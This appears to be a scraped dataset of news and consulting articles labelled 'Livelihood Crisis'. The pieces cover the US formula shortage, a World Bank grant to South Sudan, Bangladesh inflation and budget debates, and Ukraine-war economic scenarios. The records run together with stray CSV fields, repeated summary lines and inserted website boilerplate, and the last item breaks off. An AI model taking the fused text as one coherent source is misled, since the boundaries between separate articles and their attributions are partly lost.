During pandemic, lack of information became a challenge. A special scheme from ministry of electronics & information technology focused on digital literacy for elders would be welcome, along with family and community making efforts at their level to train. Youth particularly can play a big role through volunteering. The other important areas are disaster mitigation, response and rehabilitation where elders can contribute to plans, and add perspectives based on their experience, capabilities and vulnerabilities. We also need much greater research on effects of climate change on elderly with data separated by age, gender and disability (mobility). The senior citizens of today and future are valuable members of the society with immense potential to contribute and make a difference.

The culmination of a trifecta of challenges—supply-chain issues, product recall and historic inflation—have resulted in a national formula crisis, all during a time when the nation is still reeling from the COVID pandemic. Forty percent of formula is out-of-stock, forcing parents to take extraordinary measures to find formula for their child, including driving out-of-state or pleading on social media. However, the fight for formula in this new Hunger Games-esque reality is not the same for all parents.

Black infants are less likely to breastfeed compared with other racial groups, according to the CDC—meaning Black babies greatly rely on formula and thus, may be more impacted by the formula shortage. To magnify the disparity, Black women are more likely than white women to have incomes less than 100 percent of the federal poverty level and to receive Special Supplemental Nutrition Program for Women, Infants and Children (WIC) benefits. While some parents are able to jump in a car and drive to other states to look for formula or pay any shelf price, not all parents are afforded the same luxury.

Parents with low incomes face the brunt of this crisis the hardest. The WIC program is designed to provide nutritious foods, information on healthy eating, and referrals to healthcare for low-income, pregnant, postpartum, and breastfeeding women, infants, and children up to the age of 5 who are at nutritional risk. With WIC, low-income parents are only able to purchase approved baby formula.

As such, the shortage has forced parents to either pay hundreds of dollars outside of the program, or face increased challenges finding formula from WIC-approved retailers. Despite the United States Department of Agriculture (USDA)’s increased flexibility to WIC participants, for parents who live paycheck to paycheck, the option to pay outside the program is not feasible.

However, the formula shortage is more than a supply-chain issue for some families as the impacts of racism make the struggle to access formula an everyday reality, not just one experienced during a national shortage.

The lingering effects of redlining—the discriminatory practice of denying a creditworthy applicant a loan for housing in a certain neighborhood based on the racial and ethnic demographic of the applicant—has systemically disenfranchised Black, Brown, Indigenous and other people of color’s communities by impacting systems of economics, housing, health and wealth.

Food security is one example how redlining has affected livelihood, health and well-being. The USDA defines food deserts as, “low-income census tracts with a substantial number of share of residents with low levels of access to retail outlets selling healthy and affordable foods.” Food deserts are more likely to be in communities that were once redlined. For example, white neighborhoods in Los Angeles have 3.2 and 1.7 times as many supermarkets as predominately Black and Latino areas, respectively.

This disparity in food access is linked to the inequitable investment in neighborhoods based on race—as white middle-class families left cities for suburbs, supermarkets followed the higher buying power, resulting in supermarket redlining or “supermarket investment in neighborhoods based on stereotypes and perceptions of income, race, and reputations.” Food deserts and supermarket redlining affect both rural (who are located further away from supermarkets) and urban (who face racial segregation and income inequality as barriers to food access) populations.

Food deserts impact food access, including access to formula. Qualifying for WIC can mean little if the family is unable to access a grocery store with qualified products, like formula, upon which families rely to nourish babies and/or to allow the mother to transition back to work. Combined with this inequitable food access, today’s supply-chain issues have turned a formula shortage into a crisis, particularly for Black and Latino families seeking to nourish their babies. The formula crisis is a racial justice issue.

President Biden invoked the Defense Production Act to accelerate infant formula production, and Congress introduced bills to protect future supply disruptions. However, this cannot be the ceiling, merely the floor. Congress must take swift action to pass legislation enacting paid leave, USDA must expand WIC provisions to make formula more accessible and grocery stores must be incentivized to stay open in low-income neighborhoods. All in all, we must work to reverse the perverse impacts of racist policies in our country by holding policymakers accountable for anti-racist policies and holding equity firmly in the center of all decision making.

About 72 percent of the population in South Sudan is under 30 years of age, representing one of the largest youth bulges in the world.
The SNSOP will implement activities to help enhance access to economic opportunities by poor and vulnerable youth, support male youth to address the challenges of “youth idleness” and empower female youth to gain equal economic opportunities.
Women are exposed to a wide range of economic and social risks in South Sudan.","JUBA, June 7, 2022—The World Bank’s Executive Board of Directors has approved $129 million in International Development Association* (IDA) grant financing to expand access to economic and livelihood opportunities for the most vulnerable households in South Sudan and strengthen the effectiveness of the national safety net system. The grant includes $25 million from the IDA19 Window for Host Communities and Refugees (WHR), and $30 million from the Crisis Response Window (CRW).

The grant will finance the South Sudan Productive Safety Net for Socioeconomic Opportunities Project (SNSOP) which is a unique four-year operation that builds on the experiences of prior projects that helped lay the foundational building blocks of the safety net system in South Sudan. The SNSOP aims to consolidate and deepen the development gains achieved to date, provide access to direct income, and increase social and economic opportunities for the poorest and most vulnerable households.

Recent external and economic shocks that include severe flooding, the COVID19 pandemic, conflict, and macroeconomic instability have disproportionately impacted vulnerable households and deepened existing vulnerabilities in South Sudan.

“Enhancing social and economic opportunities for poor and vulnerable households will contribute to achieving longer term development outcomes and build their resilience to climate impacts and other shocks. It will also make them potential drivers of economic growth, stability, and national transformation in South Sudan,” said Honorable Josephine Joseph Lagu, Minister of Agriculture and Food Security for the Republic of South Sudan.

The SNSOP will be implemented in 15 out of the 79 counties across the country. The project will not only respond to escalating food insecurity, but also lead to productive inclusion through human capital accumulation among the poor and vulnerable, including refugees and host communities. The project will help in smoothing consumption and increasing investments in child nutrition and development through the complementary social measures and behavior change communication, with a strong emphasis on gender and climate change adaptation.

The SNSOP is strongly aligned with the World Bank Group Country Engagement Note (CEN) for South Sudan for FY 2021–2023, as it promotes resilience and livelihood opportunities for those confronted with multiple shocks by providing cash transfers and income-generating opportunities. It also will build capacity in several key ministries.

“The World Bank is pleased to continue strengthening social protection mechanisms in South Sudan. This new financing will help the government to gradually establish a nationally owned safety net program. It will also help maintain a predictable and reliable national safety net system in the country and increase citizen confidence in national institutions,” said Firas Raad, World Bank Country Manager for South Sudan.

About 72 percent of the population in South Sudan is under 30 years of age, representing one of the largest youth bulges in the world. Youth in the country are facing severe livelihood challenges due to limited economic opportunities. The SNSOP will implement activities to help enhance access to economic opportunities by poor and vulnerable youth, support male youth to address the challenges of “youth idleness” and empower female youth to gain equal economic opportunities.

“The SNSOP is a much-needed and timely intervention to support the economic empowerment of female youth in the country. Women are exposed to a wide range of economic and social risks in South Sudan. The emphasis on including young women will help pave the way towards addressing the marginalization of women, bringing them into the mainstream of development,” said Ayaa Benjamin Warille, Minister of Gender, Child and Social Welfare for the Republic of South Sudan.

They also think that the budget of the upcoming fiscal year must be “an exceptional one,” as frequent hikes in commodity prices, the external trade situation, and the ongoing Russia-Ukraine war has put the economy under new pressures.

The country also must deal with the depreciation of the Taka, a downtrend in remittance inflow, and pressure on foreign reserves.

The government also should take initiatives to increase production and people’s income by creating jobs.

The inflation rate has been above 6% for three consecutive months.

The current state of inflation

The point-to-point inflation rate jumped to 6.29% in April, the highest in the last 18 months. The government had set a target of keeping the inflation rate within 5.30% in FY21-22, but an inflation rate of 5.36% recorded in July of 2021 was the lowest in the fiscal year.

In March, the overall inflation was 6.22%. In February and January, it was 6.17% and 5.86%, respectively.

Selim Raihan, executive director of SANEM, told Dhaka Tribune that a volatile situation was prevailing all over the world, with a rising global inflation rate, and Bangladesh was also feeling the pressure.

Due to the pandemic and the ongoing Russian-Ukrainian war, there had been a disruption in the global supply chain which led to the rise in the prices of raw materials, shipping costs and production costs, he added.

However, the inflation rate of the BBS has also been questioned by prominent economists of the country.

Recently, in a presentation, economist Debapriya Bhattacharya said the inflation rate is in reality higher as BBS data failed to capture the actual price level and consumer basket. He also said that the inflation rate might be as high as 12% and this trend would continue in the coming days.

The global inflation scene is also shaky, with the inflation rate in the EU at 8.1%, Eurozone 7.4%, and in the US at 8.3% as of April.

Since the beginning of the Ukraine-Russia war, wheat prices have doubled, the fuel price has crossed $100 per barrel, and prices of cotton, clinker and iron have increased by 50%-100%.

Pressure of inflation everywhere

According to recent data published by the BBS on the prices of 47 essential products, the prices of 32 products rose in April and only 13 products experienced reductions in price.

The list included rice, cooking oil, lentils, flour (atta and maida), sugar, fish, meat, milk, eggs, fuel, clothing and other essential commodities.

According to the presentation by Bhattacharya, the price of soybean hiked by 55.83%, palm oil 61.29%, flout 57.75%, lentils 46.43%, chicken 10.85%, and sugar 6.90%.

He said that the poor, lower middle class and the middle class will suffer the most if macroeconomic stability is lost as their income has not increased in line with the price hike of essentials.

The way to control inflation

Bhattacharya said the government should take adequate initiatives to control inflation from the new financial year to continue productive development work and protect livelihoods.

Creating jobs, reducing imports, widening the social safety net, stabilizing exchange systems and foreign reserves will be adequate to prevent inflation.

Zahid Hussain, a former lead economist at the World Bank, said that inflation in Bangladesh mainly occurred due to two reasons – increase in domestic demand and increase in commodity prices in the international market.

“To control inflation, we need an initiative on how to reduce it by reducing the pressure on demand and reducing the deficit in the budget,” he added.

The budget deficit in the next FY should not cross that of the current FY, he said.

He also said that the government should find a way to save from subsidies.

“Remittance senders are already benefiting from the rise in the value of the dollar, so the remittance subsidy should be lifted as the country spends Tk5,000 crore on it,” he added.

Moreover, 1% cash subsidy on exports should also be lifted, he said. “Most industries have turned their fortunes around since the pandemic.”

In the national budget, about Tk85,000 crore may be spent on subsidies, so the subsidy should be reduced in the possible sectors.

Selim Raihan said customs fees and duties on essential import products could be reduced as much as possible.

Moreover, the area of domestic supply needed to be enlarged.

“The prices of various products go up from import to consumer level due to unscrupulous traders. What kind of action can be taken against them can also be presented in the budget,” he added.

To ensure safety of lower income people

Poor and lower income people feel the most inflationary pressures and it is their livelihood crisis and the middle class feel the crisis of savings.

“Since there is not much opportunity for them by reducing the deficit, the budget should increase both the allowance and coverage areas for the poor in social safety programs,” said Zahid Hussain.

Selim Raihan said that people would look at how social protection programs were increasing their coverage area to protect those directly affected by rising inflation, such as low- and middle-income households.

Prof Mustafizur Rahman, distinguished fellow of the CPD, recently told the media the people of the country were now under inflationary pressure and it should be kept at a tolerant level as much as possible to give people relief.

“For this, expenditures in the social safety nets should be increased and side by side the poor section of people should get protection,” he added.

Moreover, as the common people are now under inflationary pressure, allocations against subsidies should be increased.

Dealing with the dollar crisis

The experts also think that it is now more important to keep the dollar stable to reduce the cost of imports to cope with inflationary pressures.

They also said that inflation could not be controlled by keeping the dollar at an unstable level.

Professor Mustafizur Rahman said that the current level of foreign currency reserves in no way created any apprehension. So the sale of US dollars should continue as per demand so that there was no crisis.

Private Investment

According to the recent presentation by Debapriya Bhattacharya, investment (as % of GDP) decreased between FY19 (32.21%) and FY21 (31.02%), with private investment decreasing to 23.07% in FY21 from 24.94% in FY18.

National savings are also declining due to rising inflation. They fell to 30.8% in FY21 from 32.1% in FY16 and domestic savings also fell to 25.3% in FY21 from 27.3% in FY16.

Considering the present circumstances, Mustafizur Rahman suggested paying more attention to the revenue budget instead of the development budget.",Livelihood Crisis,2022-06-06 17:12:50

Already, thousands of lives have been lost, and millions of livelihoods have been disrupted through displacement, lost homes, and lost incomes (Exhibit 1). We, like so many others, are shocked by the unfolding humanitarian tragedy and the consequences of this brutal war.

As in any conflict, uncertainty is high. It is unclear how the military situation, the political process, and the countermeasures around the world will play out—in either the shorter or longer term. However, it is already certain that, as a consequence of the economic impact of the crisis on energy and food markets, disruptions will affect many in Europe and beyond.

In this article, we offer an initial framing of the challenges, with full recognition of the uncertainties. We begin with a perspective on the short- and midterm disruptions and then frame scenarios for the potential impact on livelihoods in the eurozone, in the belief that some guidelines to bound uncertainty are better than none at all. As conditions change, we will adjust. We conclude with some reflections on implications for business leaders as they navigate yet another crisis.

Untangling short- and midterm disruptions

As business leaders deal with the short-term effects of the conflict, fundamental disruptions are under way that will shape the future beyond the immediate crisis. While we recognize that more challenges may emerge over time, several areas are already apparent:

The invasion of Ukraine is causing a massive humanitarian crisis. In addition to the pain and suffering experienced by those inside Ukraine, there are already more than three million people seeking refuge in neighboring nations, with similar numbers displaced within Ukraine. As in other major conflicts and refugee crises—including those in Syria and Yemen—it will be a gargantuan task for the world community to aid, shelter, and host these unfortunate people.

Once again, the vulnerable will suffer the most. Vulnerable populations are most likely to become refugees and will find it hardest to bear the rising costs of food and fuel. Aid efforts are under way globally to ensure that people’s basic needs for food, shelter, and psychological safety are met, in and beyond the conflict zone. Initial discussions on how to defray higher energy costs for all are taking place in many countries, and first funds have been made available.

Energy policy is rotating toward secure access and source diversification. The role of Russian oil and natural gas globally brings into focus the importance of access to energy. While acceleration of renewable energy can solve part of the puzzle, gas will remain an important source, and nuclear and coal may become larger components of the fuel mix to secure supply, particularly to replace potential shortages of gas. The implications for achieving publicly committed net-zero emissions are not yet clear.

Food security is on the agenda. The concentration of wheat, fertilizer, and related production in Russia and Ukraine will strain food supplies globally. Securing the continual supply of food to the countries most exposed to exports from these regions is becoming a major near-term issue.

The competition for critical materials, equipment, and commodities intensifies. The world’s real and perceived needs for secure access to natural resources, materials, and advanced equipment (for example, neon, nickel, palladium, semiconductors) is likely to grow and further intensify the race among nations and companies.

A new age of supply chain control efforts and localization attempts has arrived. The era of not looking too closely at supply chains, trusting suppliers, and optimizing for cost is probably over. Those behaviors, already made suspect by new tariff regimes and the COVID-19 pandemic, are now likely to be consigned to history. Governments and corporations are looking to increase supply chain resiliency and are considering innovative ways to fund these changes.

Global technology standards are more likely to separate. To promote security interests and foreign-policy objectives, governments have increased the use of geo-economic tools such as sanctions, direct-state support to strategic industries, and export controls over sensitive equipment, software, and technology. The coordinated use of these tools by like-minded countries in response to Russia’s invasion of Ukraine is likely to accelerate the trend toward separation of standards and independent technology development.

Financial-system ripple effects will occur. The disruption of sanctioned financial flows has the potential to ripple through the banking system and financial markets, with significant repercussions for affected bondholders, lenders, aircraft lessors, derivatives counterparties, and investors. There remains a risk of contagion with second- and third-order effects across the globe.

Defense investments are being stepped up. The show of unity and economic sanctions by North Atlantic Treaty Organization (NATO) countries, the European Union, and other European countries could drive a greater focus on defense resilience. France and Germany have both announced significant increases in defense spending. In early March 2022, the US Congress approved a $42 billion increase in America’s defense budget.

Cyber is a stage for conflict. Countries and companies have for years been concerned about the increasing frequency and sophistication of state-supported cyberattacks. Most concerning is the shift from ransomware and extortion to direct destruction. It was a major topic at the meeting between US president Joe Biden and Russia president Vladimir Putin in Geneva in June 2021. It is highly likely that these attacks will further intensify, testing the resilience of cybersecurity systems.

Corporate actors are taking a stand. This war has galvanized a strong global response against the invasion. Many corporations and other nonstate entities have restricted their activities beyond the formal requirements of sanctions to distance themselves from Russia and its actions.

Volatility, volatility, volatility. The war in Ukraine joins the already crowded timeline of 21st-century disruptions, with disparate origins and complex consequences. We see many business leaders trying to move their organizations from ad hoc reactions to each disruption to a foundation of greater resilience, staying alert to what is over the horizon and building capabilities to continually manage uncertainty.

This list covers only the most prominent vectors of disruption at this early stage of the Ukraine crisis. While there is a lot of uncertainty around how each of these will play out, many of them will likely matter a great deal to lives and livelihoods worldwide, albeit to very different extents, depending on geography and sector.

War’s impact on livelihoods: Framing potential scenarios

We have learned from conflicts around the world that livelihoods adjacent to and sometimes far from the conflict zone can also be put at risk. In part, the risk arises because of inadequate attention paid to people whose economic well-being is already precarious; in part because of the inevitable knock-on effects in a highly connected world.

In framing scenarios for how the war will potentially affect livelihoods outside the conflict zone, we draw upon a wide range of expertise. We see two critical dimensions.

First is the scale and duration of disruption. The drivers of scale and duration of disruption are complex and include both military and political factors (such as sanctions). How high the prices for natural gas, oil, agricultural commodities, and minerals and metals go will in large part determine the effects on most people’s livelihoods—price rises have to be paid out of pocket. We currently illustrate three potential levels of disruption:

Contained disruption. The disruption is significant but contained in duration and scale—for example, through a quickly negotiated cease-fire. Sanctions do not escalate further and may even be scaled back. Some refugees can return home. Energy and commodity markets stabilize, and prices begin to normalize.

Extended disruption. The disruption continues and grows for some time—for example, through hostilities that continue throughout 2022. The refugee crisis worsens. Multilateral sanctions escalate moderately. The global energy and commodity markets adapt and stabilize, but prices remain elevated for some time.

Severe, escalating disruption. The disruption becomes more pronounced in scale and duration—for example, through protracted hostilities. The refugee crisis grows more desperate. Energy, food, and commodity markets spiral higher over an extended period. Supply chains are disrupted, particularly in the Europe–Russia energy trade.

While military escalations beyond Ukraine are conceivable, we currently do not include them in our range of possibilities.

The second dimension is the impact of government policy, consumer, and business responses. Government actions will matter profoundly in modulating the impact that this war has on livelihoods. In our view, four elements are in play: (1) the COVID-19 economic policies that are in place as the world exits the Omicron wave; (2) new policies that may be initiated to blunt the impact of spiking energy prices; (3) policies and private-sector actions toward achieving net-zero emissions and sustainable growth; and (4) changes in consumer behavior. As these elements will come together unpredictably, we illustrate three potential policy responses:

Restrained response. Central banks accelerate monetary tightening to limit inflation, hitting the confidence of consumers who continue to save instead of spend. Other headwinds persist and limit growth, including labor market tensions (for example, skill mismatches, rising unemployment, stagnant wages) and the enduring challenges of the COVID-19 shock, which hamper the ability of the economy to produce.

Moderate response. Current fiscal and monetary stimulus programs continue to wind down, with a focus on steadily reining in inflation. Some new programs offer moderate, long-term support that help mitigate higher energy and food prices—for example, through fossil fuel investments or slowing down decarbonization plans. Consumers remain cautious but continue to spend moderately.

Robust response. Monetary stimulus continues to wind down and successfully brings inflation under control. Governments also launch fiscal programs to blunt the impact of rising energy and food prices. Lower inflation and additional support are enough to buoy confidence and cause consumers to spend some of their pent-up savings. Significant energy investments increase resilience to energy shocks and hasten the energy transition.

As illustrated in Exhibit 2, the intersection of these two dimensions—the scale and duration of disruption and the ensuing responses—produces a range of potential scenarios, with differing effects on global lives and livelihoods.

The current context

Across all scenarios, a few facts are immutable. The harshest effects are being felt in Ukraine. This is where lives have been lost and thrown into turmoil. Destruction of property and infrastructure is already extensive and worsening by the day. The impact of sanctions on Russia is significant: the ruble has lost about half of its value since the onset of hostilities, consumer prices are increasing rapidly, the Russian central bank has been forced to lift short-term interest rates to 20 percent, and the Russian stock market is closed.

Beyond the conflict zone, the invasion of Ukraine takes place at a fraught moment for the global economy and livelihoods, particularly the vulnerable. COVID-19 is receding in many parts of the world but is not yet gone, and it is still a crisis in many countries, with some of them struggling with the exit from public-health interventions. Furthermore, the possibility of a new and severe virus variant cannot be discounted. Also, inflation continues to gather steam in most parts of the world. In some, it has reached multidecade highs and is driving up the costs of living for households.

Energy is a particular concern (and is a key parameter across scenarios ). European natural-gas prices have jumped 60 percent since Russia started massing troops. Brent crude oil is consistently trading near $120 per barrel. Further, prices for key agricultural, mineral, and metal commodities rose 10 to 15 percent in the first week of the conflict; nickel prices doubled recently. Ukraine and Russia together produce about 30 percent of global wheat; spot market prices are up about 40 percent. They are also the largest producers of class 1 nickel (used in electric-vehicle batteries), with a 23 percent global share, and the second-largest producers of palladium (used in catalytic converters), holding a 38 percent global share.

The spike in commodity prices has shaken the confidence of consumers and businesses globally. Regardless of which scenario ultimately plays out, households may remain cautious and will keep on the sidelines the excess savings that they have accumulated during the pandemic, at least in the near term, even as the economy fully reopens. Businesses may look to slow all but necessary expenditures and hiring. And the US Federal Reserve and the European Central Bank have, as of March 11, 2022, stated that they see the risks of accelerating inflation to be greater than those of potentially weak demand and are moving to halt the inflation cycle by initiating a steady pace of interest-rate increases.

Initial economic scenarios for the eurozone

We have modeled three scenarios—1B, 2A, and 3B—which may help leaders and decision makers bound uncertainty as it appears today. Scenario 1B captures contained disruption with moderate policy response. Scenario 2A looks at extended disruption and robust policy response. Finally, scenario 3B considers outcomes from a severe, escalating disruption, but still with moderate policy response. (Scenario 3C is also a distinct possibility, if central banks act more aggressively to fight inflation and the conflict endures for some time.)

In what follows, we focus on the eurozone, which is the world’s largest macroeconomy and highly exposed to the conflict. At the conclusion of this section, we offer some considerations for other geographies. Here, we do not analyze Eastern Europe per se but are keenly aware that these nations will see direct and significant impact from the economic disruption, as well as the burgeoning refugee crisis. We use GDP to measure impact on livelihoods, as incomes are a substantial component of GDP. As is standard in scenario analyses, any point estimates in our calculations are not forecasts but merely the center point of a range of potential outcomes.

Scenario 1B: Contained disruption with moderate policy response

In this scenario, the end of hostilities occurs within a few more weeks. Sanctions do not escalate further and may even be scaled back; energy exports from Russia to Europe keep flowing. Before the end of 2022, natural-gas prices in Europe return to their precrisis peak of about $30 per million British thermal units (MMBtu); Brent crude returns to $70 to $80 per barrel. GDP growth (and thus jobs and incomes) across the eurozone reverts to its precrisis trend, albeit with a first-quarter slowdown, reflecting the shock of the invasion.

Inflation expectations remain elevated relative to prepandemic norms but are stable, and the European Central Bank continues to reduce monetary stimulus. Consumer confidence reverts to its prepandemic level, and businesses continue their COVID-19-exit investment plans through most of the eurozone by the second quarter of 2022.

Eurozone GDP growth in 2022 returns to a preinvasion trajectory of 3.8 percent. Growth falls to 2.7 percent in 2023 and 1.5 percent in 2024 as economies return to their long-term trends. Germany, the largest economy in the eurozone, follows a similar trajectory: growth of 3.5 percent in 2022, 3.0 percent in 2023, and 1.3 percent in 2024. Exhibit 3 sets out estimated GDP growth for each of the three scenarios.

Exhibit 3 We strive to provide individuals with disabilities equal access to our website. If you would like information about this content we will be happy to work with you. Please email us at: McKinsey_Website_Accessibility@mckinsey.com

The Russia/Ukraine discussions announced on March 16, 2022, if agreed, would likely result in this scenario.

Scenario 2A: Extended disruption with robust policy response

In this scenario, the end of hostilities is in sight in the second half of 2022. Sanctions do not extend into the energy sector; energy exports from Russia to Europe keep flowing. However, natural-gas prices in Europe return only to their precrisis peak of about $30 per MMBtu, and Brent crude trades between $90 and $100 per barrel throughout 2022. Consumer confidence bounces back by the end of the year, and households use their pent-up savings to drive a surge in demand, particularly for services, and businesses respond with additional investments and hiring. Further, sentiment on energy policy shifts rapidly given new concerns about energy insecurity. Businesses and governments make near-term investments in additional fossil fuel capacity to ensure resilience—and also accelerate investment in sustainable energy.

Shocks to energy, food, and other commodities boost eurozone inflation to more than 4 percent in 2022, versus 2.5 to 3.0 percent in 2021. Exhibit 4 reviews energy prices and inflation in each of the three scenarios. But prices fall back as a resolution to the war comes into view. By early 2023, the effects of energy shocks recede, and central-bank actions successfully slow inflation, with consecutive monthly increases in prices trending downward. Inflation expectations remain elevated relative to prepandemic norms but are stable, providing a strong signal that inflation has been contained.

Exhibit 4 We strive to provide individuals with disabilities equal access to our website. If you would like information about this content we will be happy to work with you. Please email us at: McKinsey_Website_Accessibility@mckinsey.com

With elevated price levels in the near term, as well as the shock from the invasion, GDP growth in the eurozone and Germany is essentially flat in 2022. Growth in the eurozone rises to 2.1 percent in 2023 and 4.8 percent in 2024. The German economy grows slightly faster: 2.7 percent in 2023 and 5.5 percent in 2024, buoyed in part by increased spending on defense.

Scenario 3B: Severe, escalating disruption with moderate policy response

In this scenario, protracted conflict intensifies the refugee crisis in Central Europe. Western countries and Russia further extend sanctions, leading to the shutdown of oil and gas exports from Russia to Europe. European gas prices more than double to $70 per MMBtu in early 2022, from their already-high level of about $30, and Brent crude jumps to $150 per barrel.

Eurozone headline inflation spikes to more than 7 percent on the year. The continent can replace some of its natural-gas shortfall in part by buying on the spot market and in part by slowing the shift away from coal. Producing and consuming nations can build new liquefied natural gas (LNG) export/import infrastructure over time, but in the near term, higher prices, lower real incomes, and reduced consumer spending will result in some demand destruction.

Combined with the collapse in confidence we are already seeing, the eurozone tips into recession in 2022 and 2023. Growth slips to –0.5 percent in both years; growth in Germany is weaker, at –1.4 percent, because of its greater reliance on natural gas. By mid-2023, the weak economy suppresses demand; energy prices fall from their peak, easing inflation considerably. Entering 2024, GDP growth resumes as consumer spending and business investment start to rebound, even as a low-intensity conflict in Ukraine continues. By the end of 2024, employment finally regains the ground it has lost since 2019, and growth moves back to prepandemic long-term trends.

Effects on other large economies

Of course, the nature of disruption and the ability of governments to respond will differ across countries, and we can anticipate a wide range of scenarios. In any scenario, growth in large economies such as China and the United States will be less directly affected than in the eurozone. Two questions arise. Will the war in Ukraine disrupt consumer and business confidence? What will be the impact of higher commodity prices?

In the United States, the key issue will be how the Federal Reserve Board reacts to the impact of the spike in oil prices and to the jump in agricultural, mining, and mineral commodity prices (US natural-gas prices are largely independent of Europe). Under more normal circumstances, the Fed would likely not react to supply-driven spikes in inflation, preferring to ensure that growth does not falter. But inflation in the United States is already uncomfortably high. On March 16, 2022, the Fed raised its short-term rate by 25 basis points, the first hike since December 2018. In its statement, the Fed also said that it “anticipates that ongoing increases in the target range will be appropriate.” Market observers are in widespread agreement that even larger 50-basis-point increases are likely. It appears that the invasion of Ukraine will only slow the pace of interest-rate hikes, not change the course of policy in the United States. In scenario 2A, US growth would be flat. In scenario 3B, shaken confidence and continued high prices for oil would reduce spending by consumers and businesses, and a recession would ensue.

The main impact in China will likely come from price increases in globally traded commodities; indirect effects such as reduced demand from trade partners will also matter. Consumer sentiment in China itself is less likely to be affected.

Implications for business leaders

The speed of this crisis has confounded many corporate leaders. The fog of war makes it hard to understand exactly what is happening in the moment, let alone chart a path forward. However, many companies need to decide how to act both now and in anticipation of longer-term disruptions, especially those we outlined at the outset.

Not every company is affected the same way. Businesses that operate in Ukraine or Russia will be most immediately affected. Right now, most of these companies are deeply engaged in safeguarding the lives of their employees.

For others, their geographic location, scope of operations, and industry sector will determine to what extent the war will affect their business. This crisis is structurally different than the pandemic. For companies outside the war zone, threats to employees’ lives are less immediate. Instead, their near-term challenges are more likely to concern the effect of sanctions and challenges of compliance, the stance toward Russia they decide to take, and, especially for manufacturing companies, inflationary effects on cost and issues related to continuity of supply.

After several months of rising inflation in much of the world, another rapid rise in commodity prices is especially concerning. It will drive headline inflation to even greater highs and lengthen the period of elevated inflation. Our conversations with executives worldwide suggest that a concerted, enterprise-wide effort is the only appropriate response. Leading companies are tackling inflation simultaneously in procurement, pricing, supply chains, the workforce, and the finance function.

Executives can be guided by the degree to which their organizations are exposed to the forces originating from this crisis. All leaders should develop a view of the scenarios that matter to them, designing models that reflect their industry and their own circumstances. Leaders concerned about more substantial impact can reactivate as appropriate proven tools from the previous few major crises, including nerve centers and plan-ahead teams. One critical difference between this crisis and COVID-19: today the world is suffering from supply shocks (which might be followed by demand shocks), while in March 2020 it was the other way around. Plan-ahead teams should start by modeling today’s supply shocks. These cross-functional teams can also help to avoid decision-making biases and other pitfalls of crisis management under high uncertainty, while also supporting longer-term resilience.

The scenarios above suggest that only a contained disruption can be absorbed by Europe and the global economy—from a macroeconomic point of view—but that window will not stay open for long. We hope that the scenarios will help you and your organization navigate a confusing and challenging period. At the same time, we recognize their shortcomings; they fail to account for the extraordinarily long and fat tail of risks that most wars implicitly carry.

This war has already caused devastation and suffering. March 2022 is reminiscent of times in Europe we all thought had long passed. In the interests of people in Ukraine and everywhere, we dearly hope that this conflict will end as soon as possible.",Livelihood Crisis,2022-03-17 07:00:00

Under such estimation, Taka 1,783 crore is likely to come as tax at source.
In such condition, Taka 2,070 crore is likely to come as tax at source.
Replying to another question, the BGMEA president said that all concerned including the business community would definitely avail benefits from the Padma Bridge once it is officially launched on June 25.
The BGMEA president also highlighted the outcomes of their visit to Europe from May 29 to June 10, 2022 as part of apparel diplomacy.","Hailing the proposed national budget for 2022-23 fiscal year, the Bangladesh Garment Manufacturers and Exporters Association on Monday demanded of the government to keep intact the tax at source at 0.5 percent for the next five years to give comfort to this sector during this crisis time.

‘It’s our earnest request, if the tax at source against exports could remain at 0.5 per cent for the next five years, then this sector will remain in comfort during this crisis time. If the industry sustains, then revenues will come while newer employments will be generated,’ said BGMEA President Faruque Hassan while addressing a press conference in a city hotel.

BGMEA senior vice president SM Mannan Kochi and vice president Md Shahidullah Azim and board directors were present, among others, on the occasion. BGMEA director Shehrin Salam Oishee moderated the press conference.

Faruque also hoped that Prime Minister Sheikh Hasina and Finance Minister AHM Mustafa Kamal would consider the issue of keeping the tax at source at the existing 0.50 per cent.

He said that the government and all concerned should remain prepared to face the possible recession in Europe and USA adding, ‘Under the circumstances, the march forward of RMG sector, the highest foreign currency earning sector, should be kept smooth by any means,’

Giving an analysis, he said that in the outgoing fiscal year (FY22), the export earnings is likely to fetch $41 billion or around Taka 3.56 lakh crore considering the Taka and dollar exchange rate at 87. Under such estimation, Taka 1,783 crore is likely to come as tax at source.

He informed that the exports earnings are likely to reach $45 billion or around Taka 4.14 lakh crore in the next fiscal year (FY23) considering the exchange rate at 92. In such condition, Taka 2,070 crore is likely to come as tax at source.

‘If we can boost exports through enhancing competitive edge, then it will be possible to increase the revenue collection without raising the tax rate. If so, our macro economy will be benefitted,’ he added.

Besides, the BGMEA president demanded of the government to provide 10 percent special incentives on export of non-cotton RMG items as well as withdrawing 10 percent income tax on cash support.

Answering to a question, Faruque welcomed the government’s step for providing tax amnesty for bringing in the undisclosed money and wealth from abroad in the mainstream of the economy.

‘The whole of the world is now under pressure of foreign currency while demand of RMG items is declining and there is further possibility of fall in demand. Under such circumstances, if such foreign currency comes through such provision, then it’s good. We’ll stand beside such decision of the government,’ he added.

He told another questioner that necessary investments are being made to boost the production of man-made fibers while export of such item is likely to pick up from next year.

Replying to another question, the BGMEA president said that all concerned including the business community would definitely avail benefits from the Padma Bridge once it is officially launched on June 25.

He also mentioned that the BGMEA has been working constantly for ensuring welfare of the garment workers. He said after tripartite discussion with the concerned stakeholders, the new wage board for the workers is likely to be formed considering the capacity of the industry and all related issues.

Faruque said many factories are providing essential commodities to workers from their fair price shops adding that such coverage would be expanded in phases.

Extending his heartfelt thanks to the premier for her firm and dynamic leadership for positioning Bangladesh into a strong zone overcoming the shocks of the pandemic, he said that the Prime Minister has safeguarded the lives and livelihood of the workers through giving stimulus during the pandemic.

Besides, he noted that the placing of Taka 6,78,064 crore proposed budget for the next fiscal year (FY23) by Finance Minister AHM Mustafa Kamal is a ‘courageous step’.

The BGMEA president noted that the slashing of corporate tax rates in the new budget would be helpful for materializing the vision for industry, trade and employment oriented economic development as well as boosting the export earnings.

He said that the recent fire incident at BM Depot in Sitakundu is a major blow to the RMG industry after the pandemic and the Russia-Ukraine war as the loss of image of the country was higher than financial loss.

In order to avert the reoccurrence of such incident in future, he also urged the concerned authorities to conduct regular off-dock audit and bring everything under intense compliance.

The BGMEA president also highlighted the outcomes of their visit to Europe from May 29 to June 10, 2022 as part of apparel diplomacy.",Livelihood Crisis,2022-06-13 12:20:00

Kevin Miller / Maine Public Adam Nordell and Johanna Davis walk alongside one of three greenhouses the operate at Songbird Farm in Unity.","The temperature had finally crept above zero on a recent morning as Johanna Davis and Adam Nordell walked along the snowy path leading to one of three greenhouses on their organic farm.

